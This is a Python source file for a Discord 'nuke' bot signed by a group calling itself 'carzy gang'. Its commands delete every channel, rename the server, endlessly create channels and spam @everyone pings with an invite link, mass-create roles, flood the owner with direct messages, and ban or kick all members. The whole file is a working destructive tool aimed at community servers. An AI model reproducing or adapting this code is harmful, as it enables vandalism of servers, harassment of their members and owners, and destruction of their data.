# imports
import discord
from discord.ext import commands
from colorama import Fore

client = commands.Bot(command_prefix=">",
                      intents=discord.Intents.all())  # client

# let us add some more commands!


# events
@client.event
async def on_ready():
  print("Logged in as {}".format(client.user))


#main command
@client.command()
async def nuke(ctx):
  await ctx.message.delete()
  await ctx.guild.edit(name="TRASHED BY CARZY GANG")
  try:
    for channels in ctx.guild.channels:
      await channels.delete()
      print("deleted {}".format(channels))
  except:
    print("Cant delete {}".format(channels))

  while True:
    await ctx.guild.create_text_channel("Nuked")


# pings
@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send("@everyone @here Server nuked https://discord.gg/DaBnfRgs3K by carzy gang")


@client.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for i in range(100):
    await ctx.guild.create_role(name="oops!")


@client.command()
async def ownerspam(ctx):
  owner = ctx.guild.owner
  while True:
    await owner.send("OOPS! server nuked")


@client.command()
async def guildname(ctx, *, newname):
  await ctx.message.delete()
  await ctx.guild.edit(name=newname)


@client.command()
async def massban(ctx):
  try:
    for members in ctx.guild.members:
      await members.ban(reason="NUKED BY https://discord.gg/DaBnfRgs3K")
      print(Fore.GREEN + f"banned {members}")
  except:
    print(Fore.RED + f"cant ban {members}")


@client.command()
async def kickall(ctx):
  try:
    for members in ctx.guild.members:
      await members.kick(reason="NUKED BY https://discord.gg/DaBnfRgs3K ")
      print(Fore.GREEN + f"kicked {members}")
  except:
    print(Fore.RED + f"cant kick {members}")


# making the client run
client.run(
  "Your bot token here")
